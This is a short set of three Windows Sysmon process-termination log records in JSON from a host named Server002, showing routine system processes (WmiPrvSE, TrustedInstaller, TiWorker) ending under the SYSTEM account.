{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:57:05.1811474"},"EventRecordID":"18000","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:57:05.177"},{"@Name":"ProcessGuid","#text":"dbf410b3-b3e3-671f-a800-000000003900"},{"@Name":"ProcessId","#text":"6000"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:57:18.5564531"},"EventRecordID":"18001","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:57:18.549"},{"@Name":"ProcessGuid","#text":"dbf410b3-b3cf-671f-8800-000000003900"},{"@Name":"ProcessId","#text":"5292"},{"@Name":"Image","#text":"C:\\Windows\\servicing\\TrustedInstaller.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:57:18.6090579"},"EventRecordID":"18002","Correlation":null,"Execution":{"@ProcessID":"3156","@ThreadID":"4004"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-28 15:57:18.595"},{"@Name":"ProcessGuid","#text":"dbf410b3-b3d0-671f-8a00-000000003900"},{"@Name":"ProcessId","#text":"5368"},{"@Name":"Image","#text":"C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.4950_none_7dd913727cb4d87c\\TiWorker.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
